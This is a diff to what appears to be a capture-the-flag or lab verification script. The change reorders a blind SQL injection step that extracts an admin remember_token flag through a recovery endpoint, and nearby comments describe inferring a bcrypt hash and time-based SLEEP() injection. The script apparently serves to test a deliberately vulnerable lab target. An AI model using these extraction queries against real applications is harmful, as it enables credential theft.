@@ -104,14 +104,6 @@ def extract_ascii(expression, length):
         chars.append(chr(low))
     return "".join(chars)
 
-db_flag = extract_ascii(
-    "SELECT remember_token FROM usage_blog.admin_users WHERE username='admin' LIMIT 1",
-    len(EXPECTED_DB),
-)
-assert db_flag == EXPECTED_DB, ("database Flag mismatch", db_flag)
-assert re.fullmatch(r"TTP\\{[a-z2-7]{16}\\}", db_flag)
-print("PASS: extracted the exact version-baked Flag from the real admin_users.remember_token field", flush=True)
-
 # Boolean-based blind SQLi: infer the bcrypt hash from the genuine MySQL table
 # using only the recovery endpoint. No database socket or target filesystem is
 # available to this attacker container.
@@ -122,6 +114,15 @@ def predicate(sql_condition):
 assert predicate("1=1")
 assert not predicate("1=2")
 print("PASS: true/false boolean SQL condition changes the application response", flush=True)
+
+db_flag = extract_ascii(
+    "SELECT remember_token FROM usage_blog.admin_users WHERE username='admin' LIMIT 1",
+    len(EXPECTED_DB),
+)
+assert db_flag == EXPECTED_DB, ("database Flag mismatch", db_flag)
+assert re.fullmatch(r"TTP\{[a-z2-7]{16}\}", db_flag)
+print("PASS: extracted the exact version-baked Flag from the real admin_users.remember_token field", flush=True)
+
 
 # Time-based blind SQLi is a separate assertion, not inferred from the boolean
 # response test. The true predicate must cause a real MySQL SLEEP() delay.
